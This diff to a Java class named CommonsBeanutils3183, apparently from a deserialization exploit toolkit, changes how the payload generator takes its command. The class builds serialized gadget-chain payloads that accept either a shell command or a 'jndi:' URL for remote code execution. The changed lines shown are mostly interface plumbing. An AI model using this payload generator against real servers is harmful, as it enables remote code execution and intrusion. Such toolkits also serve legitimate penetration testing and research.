@@ -15,10 +15,10 @@ import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
-public class CommonsBeanutils3183 {
+public class CommonsBeanutils3183 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String command = String.valueOf(type);
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         String jndiURL;
         if (command.toLowerCase().startsWith("jndi:")) {
             jndiURL = command.substring(5);
@@ -62,5 +62,10 @@ public class CommonsBeanutils3183 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
